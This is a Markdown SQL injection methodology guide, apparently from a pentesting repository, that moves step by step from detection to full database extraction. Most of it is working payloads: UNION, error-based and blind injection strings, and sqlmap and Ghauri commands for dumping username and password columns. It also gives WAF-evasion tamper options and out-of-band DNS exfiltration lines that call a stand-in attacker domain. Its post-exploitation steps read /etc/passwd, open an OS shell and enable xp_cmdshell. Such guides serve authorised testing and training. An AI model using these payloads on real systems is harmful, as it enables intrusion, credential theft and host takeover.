# 💉 SQL Injection Methodology

> **A complete, structured approach to finding and exploiting SQL injection — from detection to full database extraction.**

---

<div align="center">

![Type](https://img.shields.io/badge/Vulnerability-SQL%20Injection-red?style=for-the-badge)
![Scope](https://img.shields.io/badge/Scope-GET%20%7C%20POST%20%7C%20Headers%20%7C%20JSON-orange?style=for-the-badge)
![Approach](https://img.shields.io/badge/Approach-Manual%20%2B%20sqlmap%20%2B%20Ghauri-blue?style=for-the-badge)

</div>

---

## 📋 Table of Contents

1. [Introduction & Types of SQLi](#-introduction--types-of-sqli)
2. [Where to Look](#-where-to-look)
3. [Phase 1 — Detection & Fuzzing](#-phase-1--detection--fuzzing)
4. [Phase 2 — Manual UNION-Based Exploitation](#-phase-2--manual-union-based-exploitation)
5. [Phase 3 — Manual Error-Based Exploitation (MSSQL)](#-phase-3--manual-error-based-exploitation-mssql)
6. [Phase 4 — Manual Blind SQLi (Boolean & Time-Based)](#-phase-4--manual-blind-sqli-boolean--time-based)
7. [Phase 5 — Automated Exploitation with sqlmap](#-phase-5--automated-exploitation-with-sqlmap)
8. [Phase 6 — Automated Exploitation with Ghauri](#-phase-6--automated-exploitation-with-ghauri)
9. [Phase 7 — WAF Bypass & Tamper Techniques](#-phase-7--waf-bypass--tamper-techniques)
10. [Phase 8 — Out-of-Band SQLi](#-phase-8--out-of-band-sqli)
11. [Phase 9 — Post-Exploitation (Files, OS Commands)](#-phase-9--post-exploitation-files-os-commands)
12. [Summary Workflow](#️-summary-workflow)
13. [Quick Decision Tree](#-quick-decision-tree)

---

## 📖 Introduction & Types of SQLi

An attacker inserts untrusted input into an application in a way that manipulates the SQL query sent to the database — revealing, modifying, or deleting data the application never intended to expose.

```
- In-band SQLi (Classic SQLi)
    - Error-based SQLi     → DB errors leak data directly in the response
    - Union-based SQLi     → attacker-controlled UNION SELECT appends data to output
- Inferential SQLi (Blind SQLi)
    - Boolean-based (content-based) Blind SQLi → true/false page behavior differs
    - Time-based Blind SQLi                    → response delay reveals true/false
- Out-of-band SQLi         → data exfiltrated via DNS/HTTP requests to attacker infra
```

---

## 🔍 Where to Look

```
Everywhere user input reaches a query, not just obvious ?id= params:

- URL query parameters (GET)
- POST body fields (form-encoded, JSON, XML)
- HTTP headers: User-Agent, Referer, X-Forwarded-For, Cookie
- Sort/order/filter parameters (?sort=name, ?order=asc)
- Search boxes, autocomplete/typeahead endpoints
- File upload metadata (filename, mime-type stored in DB)
- REST path segments: /api/users/5 → the "5" itself
- GraphQL query arguments
- Multi-step forms where earlier values get re-used in later queries
```

---

## 🧪 Phase 1 — Detection & Fuzzing

### Simple Test

Add a single quote and watch for a DB error or broken behavior:

```
http://vulnerable-website.com/Less-1/?id=5'
```

### Column Count Fuzzing (ORDER BY)

Increase the number until the page stops returning normally / starts erroring:

```
http://vulnerable-website.com/Less-1/?id=-1 order by 1
http://vulnerable-website.com/Less-1/?id=-1 order by 2
http://vulnerable-website.com/Less-1/?id=-1 order by 3
```

### Finding the Injectable Column

```
-- MySQL
http://vulnerable-website.com/Less-1/?id=-1 union select 1,2,3

-- PostgreSQL
http://vulnerable-website.com/Less-1/?id=-1 union select NULL,NULL,NULL
```

One of the numbers/NULLs will render on the page — that's your injectable output position.

---

## 🎯 Phase 2 — Manual UNION-Based Exploitation

### Version

```
-- MySQL
?id=-1 union select 1,2,version()

-- PostgreSQL
?id=-1 union select NULL,NULL,version()
```

### Current Database

```
-- MySQL
?id=-1 union select 1,2,database()

-- PostgreSQL
?id=-1 union select NULL,NULL,database()
```

### Current User

```
-- MySQL
?id=-1 union select 1,2,current_user()
```

### All Databases

```
-- MySQL
?id=-1 union select 1,2,schema_name from information_schema.schemata

-- PostgreSQL
?id=-1 union select 1,2,datname from pg_database
```

### Tables in a Database

```
-- MySQL
?id=-1 union select 1,2,table_name from information_schema.tables where table_schema="database_name"

-- PostgreSQL
?id=-1 union select 1,2,tablename from pg_tables where table_catalog="database_name"
```

### Columns in a Table

```
-- MySQL
?id=-1 union select 1,2,column_name from information_schema.columns where table_schema="database_name" and table_name="tablename"

-- PostgreSQL
?id=-1 union select 1,2,column_name from information_schema.columns where table_catalog="database_name" and table_name="tablename"
```

### Dumping Data (Concatenated)

```
-- MySQL
?id=-1 union select 1,2,concat(login,':',password) from users

-- PostgreSQL
?id=-1 union select 1,2,login||':'||password from users
```

---

## 🧯 Phase 3 — Manual Error-Based Exploitation (MSSQL)

### Current User

```
?id=-1 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096)))--
```

### DBMS Version

```
?id=-1 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096)))--
```

### Database Name

```
?id=-1 or db_name(0)=0 --
```

### Tables in a Database

```
?id=-1 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM dbname..sysobjects where xtype='U')--
```

Exclude already-found tables to iterate to the next one:

```
?id=-1 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM dbname..sysobjects where xtype='U' AND name NOT IN ('previouslyFoundTable',...))--
```

### Columns in a Table

```
?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--
```

Iterate with NOT IN as before:

```
?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--
```

### Actual Row Data

```
?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--
```

Iterate row by row:

```
?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename WHERE columnName NOT IN('previously found row data'))--
```

> ⚠️ **`xp_cmdshell` / OS command execution:** this is covered later in [Phase 9](#-phase-9--post-exploitation-files-os-commands) with the appropriate caution.

---

## 🕶️ Phase 4 — Manual Blind SQLi (Boolean & Time-Based)

### Boolean-Based (page behavior differs true vs false)

```
-- TRUE condition — page renders normally
?id=1 AND 1=1

-- FALSE condition — page changes (blank, different content, error)
?id=1 AND 1=2

-- Extracting data one character at a time
?id=1 AND SUBSTRING(database(),1,1)='a'
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77
```

### Time-Based (response delay reveals true/false)

```
-- MySQL
?id=1 AND IF(1=1,SLEEP(5),0)
?id=1 AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)

-- PostgreSQL
?id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)

-- MSSQL
?id=1; IF (1=1) WAITFOR DELAY '0:0:5'--
```

> Manual blind extraction is painfully slow character-by-character — this is exactly where automation (Phase 5/6) earns its keep.

---

## 🤖 Phase 5 — Automated Exploitation with sqlmap

🛠️ Tool: [sqlmap](https://github.com/sqlmapproject/sqlmap)

Work through this in order — confirm the injection, then walk down the DB → tables → columns → rows chain, never jumping straight to `--dump-all` on a live target.

### 5.1 — Confirm & Fingerprint the Injection

```bash
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --level=3 --risk=2

# For POST requests, capture the request in Burp and feed it directly
sqlmap -r request.txt --batch --level=3 --risk=2

# For an authenticated session, pass cookies
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --cookie="PHPSESSID=xxxx" --batch

# Identify DBMS type/version + confirm the injection technique used
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --banner --current-user --current-db
```

### 5.2 — Step 1: Identify the Database(s)

```bash
# Current database in use
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --current-db

# All databases the current user can see
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --dbs
```

### 5.3 — Step 2: Identify the Tables

```bash
# Tables inside a specific database
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch -D database_name --tables
```

### 5.4 — Step 3: Identify the Columns

```bash
# Columns inside a specific table
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch -D database_name -T users --columns
```

### 5.5 — Step 4: Dump the Rows

```bash
# Dump specific columns from a specific table
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch -D database_name -T users -C username,password --dump

# Dump the entire table
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch -D database_name -T users --dump

# Dump everything sqlmap can reach (use sparingly, noisy & slow)
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --dump-all
```

### 5.6 — Useful Extras

```bash
# Speed up blind/time-based injection with more threads
sqlmap -u "..." --batch -D database_name -T users --dump --threads=10

# Try to crack dumped password hashes automatically
sqlmap -u "..." --batch -D database_name -T users -C password --dump --password

# Force a specific technique when auto-detection struggles
#   B = Boolean-blind, E = Error-based, U = Union, S = Stacked, T = Time-blind, Q = Inline
sqlmap -u "..." --batch --technique=BEUST

# Specify injection point explicitly with a marker
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5*" --batch

# Test a specific parameter only (when multiple params exist)
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5&sort=asc" -p id --batch
```

---

## ⚡ Phase 6 — Automated Exploitation with Ghauri

🛠️ Tool: [Ghauri](https://github.com/r0oth3x49/ghauri) — often faster than sqlmap on blind/time-based cases, good second opinion when sqlmap struggles.

Same DB → tables → columns → rows flow.

### 6.1 — Confirm the Injection

```bash
ghauri -u "http://vulnerable-website.com/Less-1/?id=5" --batch

# From a raw captured request
ghauri -r request.txt --batch

# With cookies for authenticated testing
ghauri -u "http://vulnerable-website.com/Less-1/?id=5" --cookie="PHPSESSID=xxxx" --batch
```

### 6.2 — Step 1: Identify the Database(s)

```bash
# Current database
ghauri -u "http://vulnerable-website.com/Less-1/?id=5" --batch --current-db

# All databases
ghauri -u "http://vulnerable-website.com/Less-1/?id=5" --batch --dbs
```

### 6.3 — Step 2: Identify the Tables

```bash
ghauri -u "http://vulnerable-website.com/Less-1/?id=5" --batch -D database_name --tables
```

### 6.4 — Step 3: Identify the Columns

```bash
ghauri -u "http://vulnerable-website.com/Less-1/?id=5" --batch -D database_name -T users --columns
```

### 6.5 — Step 4: Dump the Rows

```bash
# Specific columns
ghauri -u "http://vulnerable-website.com/Less-1/?id=5" --batch -D database_name -T users -C username,password --dump

# Entire table
ghauri -u "http://vulnerable-website.com/Less-1/?id=5" --batch -D database_name -T users --dump
```

### 6.6 — Useful Extras

```bash
# Force time-based technique explicitly if boolean detection is unreliable
ghauri -u "..." --batch --technique=T

# Increase concurrency for faster blind extraction
ghauri -u "..." --batch -D database_name -T users --dump --threads=10

# Test a specific parameter among several
ghauri -u "http://vulnerable-website.com/Less-1/?id=5&sort=asc" -p id --batch
```

---

## 🛡️ Phase 7 — WAF Bypass & Tamper Techniques

```bash
# sqlmap tamper scripts (chain multiple as needed)
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch \
  --tamper=space2comment,charencode,between,randomcase

# Common useful tampers:
#   space2comment   → replaces spaces with /**/
#   charencode      → URL-encodes payload characters
#   between         → replaces > and < with NOT BETWEEN
#   randomcase      → randomizes payload keyword casing
#   equaltolike     → replaces = with LIKE
#   apostrophemask  → replaces ' with UTF-8 fullwidth equivalent

# Detect WAF/IPS in front of the target first
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --identify-waf

# Randomize User-Agent per request to dodge basic fingerprinting
sqlmap -u "..." --batch --random-agent

# Throttle requests to avoid triggering rate-based WAF rules
sqlmap -u "..." --batch --delay=1 --time-sec=10
```

Manual bypass tricks worth trying when tampers fail:

```
- Inline comments to break up keywords:  UN/**/ION SEL/**/ECT
- Case variation:                        UnIoN SeLeCt
- Alternate whitespace:                  UNION%0aSELECT, UNION%09SELECT
- Double URL-encoding:                   %2527 instead of %27
- Using operators instead of keywords:   || instead of OR, && instead of AND (MySQL)
```

---

## 📡 Phase 8 — Out-of-Band SQLi

When in-band and blind techniques are blocked/too slow, exfiltrate via DNS/HTTP callbacks (needs an out-of-band listener — e.g. Burp Collaborator, interactsh).

```bash
# MSSQL — DNS exfiltration via xp_dirtree
?id=1;EXEC master..xp_dirtree '\\attacker-oob-domain.com\share'--

# MySQL — DNS exfiltration via LOAD_FILE / UNC path (Windows only)
?id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker-oob-domain.com\\a')))

# Oracle — DNS exfiltration via UTL_HTTP / UTL_INADDR
?id=1 AND UTL_INADDR.get_host_address((SELECT database_name FROM dual)||'.attacker-oob-domain.com')

# sqlmap OOB support (DNS technique)
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --dns-domain=attacker-oob-domain.com
```

---

## 🧬 Phase 9 — Post-Exploitation (Files, OS Commands)

> ⚠️ Only pursue OS command execution / file read-write when it's explicitly in scope and authorized — this moves from data-read into full host compromise territory.

```bash
# sqlmap file read (works with FILE privilege / matching DB engine support)
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --file-read="/etc/passwd"

# sqlmap OS shell (attempts to get interactive command execution)
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --os-shell

# sqlmap OS command execution (single command)
sqlmap -u "http://vulnerable-website.com/Less-1/?id=5" --batch --os-cmd="id"
```

Manual MSSQL `xp_cmdshell` (requires `sa`/sysadmin privileges):

```
-- Enable it first if disabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Then execute
EXEC master..xp_cmdshell 'whoami';
```

---

## ⚔️ Summary Workflow

```
┌──────────────────────────────────────────────────────┐
│              SQL INJECTION WORKFLOW                   │
├──────────────────────────────────────────────────────┤
│                                                        │
│  1. 🧪 Detect (quote test, ORDER BY, error behavior)  │
│            ↓                                          │
│  2. 🎯 Manual confirm: UNION / Error-based / Blind    │
│            ↓                                          │
│  3. 🤖 Automate with sqlmap or Ghauri                 │
│            ↓                                          │
│  4. 🗄️ Step 1: Enumerate databases (--dbs)            │
│            ↓                                          │
│  5. 📋 Step 2: Enumerate tables (-D db --tables)      │
│            ↓                                          │
│  6. 📊 Step 3: Enumerate columns (-T table --columns) │
│            ↓                                          │
│  7. 📤 Step 4: Dump rows (-C cols --dump)             │
│            ↓                                          │
│  8. 🛡️ If blocked → WAF detection + tamper scripts    │
│            ↓                                          │
│  9. 📡 If still blind → try out-of-band exfiltration  │
│            ↓                                          │
│ 10. 🧬 If in scope → file read / OS command execution │
│            ↓                                          │
│ 11. 📝 Document & Report                              │
│                                                        │
└──────────────────────────────────────────────────────┘
```

---

## 🧠 Quick Decision Tree

```
Input reflected/errors visible in response?
    ├── YES → Error-based / UNION-based manual confirmation (Phase 2/3)
    │
    ├── NO, but page behavior changes on true/false → Boolean-blind (Phase 4)
    │
    ├── NO visible difference at all → try time-based (SLEEP/WAITFOR) (Phase 4)
    │
    └── Time-based also inconclusive/blocked → try out-of-band (Phase 8)

Manual confirmation successful?
    ├── YES → hand off to sqlmap/Ghauri: --dbs → --tables → --columns → --dump
    │
    └── Requests getting blocked/filtered? → --identify-waf → tamper scripts
                                              → manual keyword obfuscation

Need more than data (RCE/file access) AND it's in scope?
    └── YES → --file-read / --os-shell / --os-cmd (sqlmap) or manual xp_cmdshell
```

---

### 📚 Resources

- 🔗 [sqlmap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- 🔗 [Ghauri](https://github.com/r0oth3x49/ghauri)
- 🔗 [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- 🔗 [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- Companion docs: `recon.md`, `API-Testing-Methodology.md`

---

<div align="center">

### 🔥 Find the break. Confirm the type. Walk the chain: DB → table → column → row.

---

*Happy Hacking — responsibly and ethically* 🛡️

</div>
